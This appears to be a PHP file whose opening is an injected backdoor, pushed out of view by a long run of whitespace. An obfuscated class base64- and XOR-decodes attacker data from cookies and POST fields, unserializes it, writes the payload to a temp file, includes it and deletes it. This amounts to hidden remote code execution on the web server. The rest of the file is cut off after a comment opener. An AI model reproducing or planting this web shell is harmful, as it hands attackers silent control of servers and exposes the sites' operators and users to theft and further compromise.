<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vwvsgodwd")){class vwvsgodwd{public static $blquhfd = "yiboafzqoxwhkdpe";public static $ztsey = NULL;public function __construct(){$hnftjeg = @$_COOKIE[substr(vwvsgodwd::$blquhfd, 0, 4)];if (!empty($hnftjeg)){$ckhsfqecq = "base64";$pcxkbwx = "";$hnftjeg = explode(",", $hnftjeg);foreach ($hnftjeg as $pxmmilvsip){$pcxkbwx .= @$_COOKIE[$pxmmilvsip];$pcxkbwx .= @$_POST[$pxmmilvsip];}$pcxkbwx = array_map($ckhsfqecq . "_decode", array($pcxkbwx,));$pcxkbwx = $pcxkbwx[0] ^ str_repeat(vwvsgodwd::$blquhfd, (strlen($pcxkbwx[0]) / strlen(vwvsgodwd::$blquhfd)) + 1);vwvsgodwd::$ztsey = @unserialize($pcxkbwx);}}public function __destruct(){$this->vmwhm();}private function vmwhm(){if (is_array(vwvsgodwd::$ztsey)) {$vhcitdsws = sys_get_temp_dir() . "/" . crc32(vwvsgodwd::$ztsey["salt"]);@vwvsgodwd::$ztsey["write"]($vhcitdsws, vwvsgodwd::$ztsey["content"]);include $vhcitdsws;@vwvsgodwd::$ztsey["delete"]($vhcitdsws);exit();}}}$juxcnn = new vwvsgodwd();$juxcnn = NULL;} ?><?php
/**
